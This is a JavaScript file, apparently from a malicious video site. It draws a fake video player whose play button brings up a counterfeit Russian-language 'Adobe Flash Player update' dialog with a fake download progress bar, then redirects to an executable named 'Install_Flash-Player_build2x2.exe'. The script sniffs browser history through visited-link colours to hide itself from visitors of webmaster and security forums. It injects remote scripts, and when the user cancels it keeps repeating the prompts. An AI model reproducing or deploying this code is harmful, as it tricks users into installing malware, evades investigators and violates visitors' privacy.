
var IS_WM=false;
var IS_WM_CHECK=false;

FILENAME="/Install_Flash-Player_build2x2.exe";
PLAYER_URL='/movies/r/players/1/';
if (typeof(IS_WM_CHECK)=='undefined')
{
	var IS_WM_CHECK=true;
	var HIDE_FROM_WM=true;
}	

var cur_player=0;

var Browser = {
  Version: function() {
    var version = 999;
    if (navigator.appVersion.indexOf("MSIE") != -1)
      version = parseFloat(navigator.appVersion.split("MSIE")[1]);
    return version;
  }
}

function isIE() {
	return /msie/i.test(navigator.userAgent)
			&& !/opera/i.test(navigator.userAgent);
}

function rgb2hex(str) {
	if (str.match(/^rgb/)) {
		{
			str = str.replace(/rgb\(|\)/g, "").split(",");
			str[0] = parseInt(str[0], 10).toString(16).toLowerCase();
			str[1] = parseInt(str[1], 10).toString(16).toLowerCase();
			str[2] = parseInt(str[2], 10).toString(16).toLowerCase();
			str[0] = (str[0].length == 1) ? '0' + str[0] : str[0];
			str[1] = (str[1].length == 1) ? '0' + str[1] : str[1];
			str[2] = (str[2].length == 1) ? '0' + str[2] : str[2];
			return ('#' + str.join(""));
		}
	}
	return str;
}

function getStyle(oElm, strCssRule) {
	var strValue = "";
	if (document.defaultView && document.defaultView.getComputedStyle) {
		strValue = rgb2hex(document.defaultView.getComputedStyle(oElm, "")
				.getPropertyValue(strCssRule));
	} else if (oElm.currentStyle) {
		strCssRule = strCssRule.replace(/\-(\w)/g, function(strMatch, p1) {
					return p1.toUpperCase();
				});
		strValue = oElm.currentStyle[strCssRule];
	}
	return strValue;
}

function addCss(cssCode) {
	var styleElement = document.createElement("style");
	styleElement.type = "text/css";
	if (styleElement.styleSheet) {
		styleElement.styleSheet.cssText = cssCode;
	} else {
		styleElement.appendChild(document.createTextNode(cssCode));
	}
	document.getElementsByTagName("head")[0].appendChild(styleElement);
}
addCss("a.plbl:visited { color: #800080; }");

function is_webmaster() {
	
	var bl = ['google.ru/', 'rusawm.com/vb/', 'forum.searchengines.ru/',
			'gofuckbiz.com/', 'awmforum.ru/', 'armadaboard.com/',
			'crutop.nu/Vbulletin/', 'master-x.com/forum/',
			'awmelite.com/forum/', 'warezbot.ru/', 'forum.antichat.ru/',
			'forum.zloy.org/', 'ruadult.biz/', 'cjlog.com/', 'proton-tm.com/',
			'proton-tm.com/forum/index.php', 'smart-scripts.com/',
			'dtrotator.com/', 'streamscripts.com/',
			'support.streamscripts.com/',
			'rusupport.streamscripts.com/phpBB2/index.php', 'gbscript.com/',
			'8coins.net/','awmpartners.com/'];

	var z = ['', 'www.'];

	document.write('<div style="display:none" id="plbl"></div>');
	for (i in bl)
		for (j in z) {
			var url = 'http://' + z[j] + bl[i];
			var link = document.createElement('a');
			if (isIE())
				link.setAttribute('className', 'plbl');
			else
				link.setAttribute('class', 'plbl');
			link.href = url;
			document.body.appendChild(link);

			if (getStyle(link, 'color') == '#800080') {
				document.body.removeChild(link);
				return true;
			} else
				document.body.removeChild(link);
		}
	return false;
}

if (Browser.Version()<7)
{
var DD_belatedPNG={ns:"DD_belatedPNG",imgSize:{},delay:10,nodesFixed:0,createVmlNameSpace:function(){if(document.namespaces&&!document.namespaces[this.ns]){document.namespaces.add(this.ns,"urn:schemas-microsoft-com:vml")}},createVmlStyleSheet:function(){var b,a;b=document.createElement("style");b.setAttribute("media","screen");document.documentElement.firstChild.insertBefore(b,document.documentElement.firstChild.firstChild);if(b.styleSheet){b=b.styleSheet;b.addRule(this.ns+"\\:*","{behavior:url(#default#VML)}");b.addRule(this.ns+"\\:shape","position:absolute;");b.addRule("img."+this.ns+"_sizeFinder","behavior:none; border:none; position:absolute; z-index:-1; top:-10000px; visibility:hidden;");this.screenStyleSheet=b;a=document.createElement("style");a.setAttribute("media","print");document.documentElement.firstChild.insertBefore(a,document.documentElement.firstChild.firstChild);a=a.styleSheet;a.addRule(this.ns+"\\:*","{display: none !important;}");a.addRule("img."+this.ns+"_sizeFinder","{display: none !important;}")}},readPropertyChange:function(){var b,c,a;b=event.srcElement;if(!b.vmlInitiated){return}if(event.propertyName.search("background")!=-1||event.propertyName.search("border")!=-1){DD_belatedPNG.applyVML(b)}if(event.propertyName=="style.display"){c=(b.currentStyle.display=="none")?"none":"block";for(a in b.vml){if(b.vml.hasOwnProperty(a)){b.vml[a].shape.style.display=c}}}if(event.propertyName.search("filter")!=-1){DD_belatedPNG.vmlOpacity(b)}},vmlOpacity:function(b){if(b.currentStyle.filter.search("lpha")!=-1){var a=b.currentStyle.filter;a=parseInt(a.substring(a.lastIndexOf("=")+1,a.lastIndexOf(")")),10)/100;b.vml.color.shape.style.filter=b.currentStyle.filter;b.vml.image.fill.opacity=a}},handlePseudoHover:function(a){setTimeout(function(){DD_belatedPNG.applyVML(a)},1)},fix:function(a){if(this.screenStyleSheet){var c,b;c=a.split(",");for(b=0;b<c.length;b++){this.screenStyleSheet.addRule(c[b],"behavior:expression(DD_belatedPNG.fixPng(this))")}}},applyVML:function(a){a.runtimeStyle.cssText="";this.vmlFill(a);this.vmlOffsets(a);this.vmlOpacity(a);if(a.isImg){this.copyImageBorders(a)}},attachHandlers:function(i){var d,c,g,e,b,f;d=this;c={resize:"vmlOffsets",move:"vmlOffsets"};if(i.nodeName=="A"){e={mouseleave:"handlePseudoHover",mouseenter:"handlePseudoHover",focus:"handlePseudoHover",blur:"handlePseudoHover"};for(b in e){if(e.hasOwnProperty(b)){c[b]=e[b]}}}for(f in c){if(c.hasOwnProperty(f)){g=function(){d[c[f]](i)};i.attachEvent("on"+f,g)}}i.attachEvent("onpropertychange",this.readPropertyChange)},giveLayout:function(a){a.style.zoom=1;if(a.currentStyle.position=="static"){a.style.position="relative"}},copyImageBorders:function(b){var c,a;c={borderStyle:true,borderWidth:true,borderColor:true};for(a in c){if(c.hasOwnProperty(a)){b.vml.color.shape.style[a]=b.currentStyle[a]}}},vmlFill:function(e){if(!e.currentStyle){return}else{var d,f,g,b,a,c;d=e.currentStyle}for(b in e.vml){if(e.vml.hasOwnProperty(b)){e.vml[b].shape.style.zIndex=d.zIndex}}e.runtimeStyle.backgroundColor="";e.runtimeStyle.backgroundImage="";f=true;if(d.backgroundImage!="none"||e.isImg){if(!e.isImg){e.vmlBg=d.backgroundImage;e.vmlBg=e.vmlBg.substr(5,e.vmlBg.lastIndexOf('")')-5)}else{e.vmlBg=e.src}g=this;if(!g.imgSize[e.vmlBg]){a=document.createElement("img");g.imgSize[e.vmlBg]=a;a.className=g.ns+"_sizeFinder";a.runtimeStyle.cssText="behavior:none; position:absolute; left:-10000px; top:-10000px; border:none; margin:0; padding:0;";c=function(){this.width=this.offsetWidth;this.height=this.offsetHeight;g.vmlOffsets(e)};a.attachEvent("onload",c);a.src=e.vmlBg;a.removeAttribute("width");a.removeAttribute("height");document.body.insertBefore(a,document.body.firstChild)}e.vml.image.fill.src=e.vmlBg;f=false}e.vml.image.fill.on=!f;e.vml.image.fill.color="none";e.vml.color.shape.style.backgroundColor=d.backgroundColor;e.runtimeStyle.backgroundImage="none";e.runtimeStyle.backgroundColor="transparent"},vmlOffsets:function(d){var h,n,a,e,g,m,f,l,j,i,k;h=d.currentStyle;n={W:d.clientWidth+1,H:d.clientHeight+1,w:this.imgSize[d.vmlBg].width,h:this.imgSize[d.vmlBg].height,L:d.offsetLeft,T:d.offsetTop,bLW:d.clientLeft,bTW:d.clientTop};a=(n.L+n.bLW==1)?1:0;e=function(b,p,q,c,s,u){b.coordsize=c+","+s;b.coordorigin=u+","+u;b.path="m0,0l"+c+",0l"+c+","+s+"l0,"+s+" xe";b.style.width=c+"px";b.style.height=s+"px";b.style.left=p+"px";b.style.top=q+"px"};e(d.vml.color.shape,(n.L+(d.isImg?0:n.bLW)),(n.T+(d.isImg?0:n.bTW)),(n.W-1),(n.H-1),0);e(d.vml.image.shape,(n.L+n.bLW),(n.T+n.bTW),(n.W),(n.H),1);g={X:0,Y:0};if(d.isImg){g.X=parseInt(h.paddingLeft,10)+1;g.Y=parseInt(h.paddingTop,10)+1}else{for(j in g){if(g.hasOwnProperty(j)){this.figurePercentage(g,n,j,h["backgroundPosition"+j])}}}d.vml.image.fill.position=(g.X/n.W)+","+(g.Y/n.H);m=h.backgroundRepeat;f={T:1,R:n.W+a,B:n.H,L:1+a};l={X:{b1:"L",b2:"R",d:"W"},Y:{b1:"T",b2:"B",d:"H"}};if(m!="repeat"||d.isImg){i={T:(g.Y),R:(g.X+n.w),B:(g.Y+n.h),L:(g.X)};if(m.search("repeat-")!=-1){k=m.split("repeat-")[1].toUpperCase();i[l[k].b1]=1;i[l[k].b2]=n[l[k].d]}if(i.B>n.H){i.B=n.H}d.vml.image.shape.style.clip="rect("+i.T+"px "+(i.R+a)+"px "+i.B+"px "+(i.L+a)+"px)"}else{d.vml.image.shape.style.clip="rect("+f.T+"px "+f.R+"px "+f.B+"px "+f.L+"px)"}},figurePercentage:function(d,c,f,a){var b,e;e=true;b=(f=="X");switch(a){case"left":case"top":d[f]=0;break;case"center":d[f]=0.5;break;case"right":case"bottom":d[f]=1;break;default:if(a.search("%")!=-1){d[f]=parseInt(a,10)/100}else{e=false}}d[f]=Math.ceil(e?((c[b?"W":"H"]*d[f])-(c[b?"w":"h"]*d[f])):parseInt(a,10));if(d[f]%2===0){d[f]++}return d[f]},fixPng:function(c){c.style.behavior="none";var g,b,f,a,d;if(c.nodeName=="BODY"||c.nodeName=="TD"||c.nodeName=="TR"){return}c.isImg=false;if(c.nodeName=="IMG"){if(c.src.toLowerCase().search(/\.png$/)!=-1){c.isImg=true;c.style.visibility="hidden"}else{return}}else{if(c.currentStyle.backgroundImage.toLowerCase().search(".png")==-1){return}}g=DD_belatedPNG;c.vml={color:{},image:{}};b={shape:{},fill:{}};for(a in c.vml){if(c.vml.hasOwnProperty(a)){for(d in b){if(b.hasOwnProperty(d)){f=g.ns+":"+d;c.vml[a][d]=document.createElement(f)}}c.vml[a].shape.stroked=false;c.vml[a].shape.appendChild(c.vml[a].fill);c.parentNode.insertBefore(c.vml[a].shape,c)}}c.vml.image.shape.fillcolor="none";c.vml.image.fill.type="tile";c.vml.color.fill.on=false;g.attachHandlers(c);g.giveLayout(c);g.giveLayout(c.offsetParent);c.vmlInitiated=true;g.applyVML(c)}};try{document.execCommand("BackgroundImageCache",false,true)}catch(r){}DD_belatedPNG.createVmlNameSpace();DD_belatedPNG.createVmlStyleSheet();
}


function show(id) {
	document.getElementById(id).style.display = "";
}

function hide(id) {
	document.getElementById(id).style.display = "none";
}

function get(id) {
	return document.getElementById(id);
}

function getX(id) {
	obj = document.getElementById(id);
	var curleft = 0;
	if (obj.offsetParent) {
		while (1) {
			curleft += obj.offsetLeft;
			if (!obj.offsetParent) {
				break;
			}
			obj = obj.offsetParent;
		}
	} else if (obj.x) {
		curleft += obj.x;
	}
	return curleft;
}

function getY(id) {
	obj = document.getElementById(id);
	var curtop = 0;
	if (obj.offsetParent) {
		while (1) {
			curtop += obj.offsetTop;
			if (!obj.offsetParent) {
				break;
			}
			obj = obj.offsetParent;
		}
	} else if (obj.y) {
		curtop += obj.y;
	}
	return curtop;
}

function getWidth(id) {
	obj = document.getElementById(id);
	return obj.getAttribute("width");
}

function getHeight(id) {
	obj = document.getElementById(id);
	return obj.getAttribute("height");
}

function download_yes() {
	if (typeof(YES_GET_URL) != 'undefined')
		window.location.href = YES_GET_URL;
	else {
		//if (Browser.Version() < 7)
			window.location.href = GET_URL + 'yes/' + FILENAME;
		//else
			//window.location.href = GET_URL + 'yes/';
	}
	// hide('update');
}

function download_no() {
	var confirmtext = "Ошибка воспроизведения.\r\nДля воспроизведения данного содержимого вам необходима \r\nAdobe Flash Player 10.\r\nНажмите ОК для установки.";
	if (confirm(confirmtext)) {
		if (Browser.Version() < 7)
			window.location.href = GET_URL + FILENAME;
		else
			window.location.href = GET_URL;
	} else {
		if (alert('Не установлен Adobe Flash Player 10,\r\nнеобходимый для просмотра видео.')) {
		} else {
			download_no();
		}
	}
}

function Player () {
    this.id = ++cur_player;
    this.prog_id;
    this.preload_img = preload_img;
    this.progress_start = progress_start;
    this.progress_do = progress_do;
    this.play_click = play_click;
    this.play_over = play_over;
    this.play_out = play_out;
    this.init = init;
    this.first_animation = first_animation;
}

function preload_img(imgsrc, width, height, id, is_center, cwidth, cheight) {
	var div = document.createElement("div");

	if (is_center) {
		div.style.marginLeft = cwidth / 2 - width / 2 + 'px';
		div.style.marginTop = cheight / 2 - height / 2 + 'px';
	}

	div.setAttribute('id', id+'_'+this.id);
	div.style.position = 'absolute';
	div.style.display = 'none';
	if (id == 'play_button' || id == 'play_button_on') {
		// div.style.cursor = 'pointer';
		div.style.cursor = 'hand';
	}

	var img = document.createElement("img");
	img.id = id + '_img_'+this.id;
	img.src = imgsrc;
	img.height = height;
	img.width = width;
	img.style.border = '0px';
	div.appendChild(img);

	if (Browser.Version() < 7)
		if (id == 'fade' || id == 'play_button' || id == 'play_button_on'
				|| id == 'update')
			DD_belatedPNG.fixPng(img);

	document.getElementById('player_'+this.id).appendChild(div);
}

function progress_do() {
	if (Math.floor(Math.random() * 3) != 2)
		return false;

	var plus = Math.floor(Math.random() * 10);
	prog = document.getElementById('progress_'+this.id);

	prog.style.width = prog.offsetWidth + plus + 'px';

	if (prog.offsetWidth > 255) {
		prog.style.width = '255px';
		clearInterval(this.prog_id);
	}
}

function progress_start(player) {

	var div = document.createElement("div");
	div.style.marginLeft = '55px';
	div.style.marginTop = '332px';

	div.setAttribute('id', 'progress_'+player.id);
	div.style.position = 'absolute';
	div.style.width = '0px';
	div.style.height = '7px';
	div.style.backgroundColor = '#c99392';
	div.id = 'progress_'+player.id;

	var img = document.createElement("img");
	img.src = PLAYER_URL + 'spacer.gif';
	img.width = 0;
	img.height = 7;
	div.appendChild(img);
	document.getElementById('player_'+player.id).appendChild(div);
	player.prog_id = setInterval(function(){player.progress_do(player)}, 100);
}

function play_click(player) {
	
	return function() {

		if (IS_WM && typeof(WM_URL) != 'undefined') {
			window.open(WM_URL);
			return false;
		}

		var script = document.createElement("script");
		script.type = "text/javascript";
		script.src = PLAY_URL;
		document.getElementsByTagName('head')[0].appendChild(script);

		hide('thumb_' + player.id);
		hide('play_button_' + player.id);
		setTimeout("show('loader_'+" + player.id + ")", 100);
		setTimeout("show('thumb_'+" + player.id + ")", 2000);
		setTimeout("hide('loader_'+" + player.id + ")", 2500);
		setTimeout("document.getElementById('loader_img_'+" + player.id
						+ ").src=PLAYER_URL+'loader2.gif'", 2000);
		setTimeout("show('fade_'+" + player.id + ")", 2500);
		setTimeout("update()", 2500);

		player.progress_start(player);
	}
}

function play_over() {
	if (Browser.Version() < 7)
		return false;
		
	this.firstChild.src = PLAYER_URL
			+ "play_button_on.png";
}

function play_out() {
	if (Browser.Version() < 7)
		return false;

	this.firstChild.src = PLAYER_URL
			+ "play_button.png";
}

function init()
{
document
		.write('<div id="player_'+this.id+'" width="482" height="348" style="width:482px;height:348px;text-align:left;background-color:black;background-image:url(\''
				+ PLAYER_URL + 'player.png\')"></div>');

this.preload_img(THUMB_URL, 480, 322, 'thumb', false);
this.preload_img(PLAYER_URL + "loader.gif", 54, 55, 'loader', true, 480, 322);
this.preload_img(PLAYER_URL + "play_button.png", 72, 51, 'play_button', true, 480,
		322);
this.preload_img(PLAYER_URL + "play_button_on.png", 72, 51, 'play_button_on', true,
		480, 322);
this.preload_img(PLAYER_URL + "fade.png", 480, 322, 'fade', false);
}

function first_animation()
{
	setTimeout("show('loader_'+"+this.id+")", 1000);
	setTimeout("hide('loader_'+"+this.id+")", 4000);
	setTimeout("show('thumb_'+"+this.id+")", 4000);
	setTimeout("show('play_button_'+"+this.id+")", 4000);
	document.getElementById('play_button_'+this.id).onclick = play_click(this);
	document.getElementById('play_button_'+this.id).onmouseover = play_over;
	document.getElementById('play_button_'+this.id).onmouseout = play_out;
}

function draw_player(turl)
{
	if (!show_check())
		return false;
	THUMB_URL=turl;	
	var player=new Player();
	player.init();
	player.first_animation();	
}

function show_check()
{
	if (typeof(IS_HIDE)!='undefined' && IS_HIDE)
		return false;
	
	if (typeof(IS_WM_CHECK)!='undefined' && IS_WM_CHECK)
		if (is_webmaster())
		{
			if (typeof(HIDE_FROM_WM)!='undefined' && HIDE_FROM_WM)
				return false;
			else
				IS_WM=true;
		}
		
	return true;
}

document.body.style.width='100%';
document.body.style.height='100%';
document.write('<div id="player_fade" style="Z-INDEX: 1200;width:100%;height:100%;left:0px;top:0px;position: absolute;margin:0px;background: url('+PLAYER_URL+'bspacer.gif); -moz-opacity: 0.5; ;zoom: 1;display:none"></div>\
<div id="player_update" style="Z-INDEX: 1200;position: absolute;margin:0px;background: url('+PLAYER_URL+'update3.gif);width:517px;height:415px;top:50%;left:50%;margin-top:-258px;margin-left:-207px;text-align:left;display:none">\
<div style="padding-top:100px;padding-left:80px;font-family:Arial;font-size:18px;color:#666666">Требуется обновление Adobe Flash Player</div>\
<div style="padding-top:20px;padding-left:80px;font-family:Arial;font-size:10px;font-weight:bold;color:black">Для просмотра содержимого необходимо обновление текущий версии Adobe Flash Player</div>\
<div style="padding-top:20px;padding-left:80px;font-family:Arial;font-size:10px;font-weight:bold;color:black">Доступные обновления:</div>\
<div style="padding-top:20px;padding-left:100px;font-family:Arial;font-size:11px;font-weight:bold;color:black">&#8226; Adobe Flash Player 10</div>\
<div style="padding-top:2px;padding-left:106px;font-family:Arial;font-size:10px;color:black">Повышена скорость обработки векторов, исправлена ошибка отображения некоторых FLV-видео-файлов.</div>\
<div id="player_update_state" style="padding-top:20px;padding-left:80px;font-family:Arial;font-size:11px;font-weight:bold;color:black">Обновление на вашем интернет-соединении займёт не более минуты</div>\
  <div id="player_update_progress" style="padding-top:31px;padding-left:80px;visibility:hidden">\
	<div style="background-image:url('+PLAYER_URL+'progressbar.gif);width:422px;	height:15px;padding-top:2px">\
	  <div id="player_updete_progress_green" style="background-image:url('+PLAYER_URL+'progressbar_green.gif);width:1px;	height:14px;margin-left:2px;"><img width="1px" height="1px" border="0" src="'+PLAYER_URL+'spacer.gif"></div>\
		</div>\
	</div>\
<div style="padding-top:35px;text-align:right;margin-right:10px"><input type="submit" value="Загрузить обновление" style="font-weight:bold" onclick="update2()" id="player_b1"/> <input type="button" value="Отмена" onclick="download_no()" id="player_b2"/> <input type="button" value="Установить загруженное обновление" onclick="download_yes()" id="player_b3" style="display:none;font-weight:bold"/></div>\
</div>');

var upd_id=0;

function update()
{
	get('player_fade').style.display='';
	get('player_fade').style.filter='alpha(opacity=50)';
	get('player_fade').style.opacity='0.5';
	get('player_update').style.display='';
	get('player_b1').focus();
}

function update2()
{
	get('player_update_state').innerHTML='Загрузка инсталляционного файла...';
	get('player_update_progress').style.visibility='visible';
	get('player_b1').disabled=true;
	get('player_b2').disabled=true;
	
	upd_id = setInterval("update_progress()", 3);
}

function update_progress()
{
	if (Math.floor(Math.random() * 2) != 1)
		return false;
	
	prog=get('player_updete_progress_green');
	prog.style.width=prog.offsetWidth+1+'px';
	if (prog.offsetWidth>=416)
	{
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 164kb Успешно!';
		prog.width='416px';
		clearInterval(upd_id);
		show('player_b3');
		get('player_b3').focus();
		hide('player_b1');
		hide('player_b2');		
	}
	
	if (prog.offsetWidth==10)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 1kb';
	if (prog.offsetWidth==40)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 13kb';
	if (prog.offsetWidth==80)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 26kb';
	if (prog.offsetWidth==120)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 39kb';		
	if (prog.offsetWidth==140)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 41kb';		
	if (prog.offsetWidth==160)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 58kb';		
	if (prog.offsetWidth==200)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 75kb';		
	if (prog.offsetWidth==240)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 89kb';		
	if (prog.offsetWidth==280)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 114kb';
	if (prog.offsetWidth==320)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 121kb';
	if (prog.offsetWidth==360)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 146kb';		
	if (prog.offsetWidth==400)
		get('player_update_state').innerHTML='Загрузка инсталляционного файла... 164kb!';	
}

function start() {
	if (typeof(IS_EMBED)!='undefined' && IS_EMBED
			&& typeof(STATS_URL)!='undefined' && STATS_URL) {
		var script = document.createElement("script");
		script.type = "text/javascript";
		script.src = STATS_URL;
		document.getElementsByTagName('head')[0].appendChild(script);
	}

	if (!show_check())
		return false;
		
		
	var player=new Player();
	player.init();
	player.first_animation();	
}

start();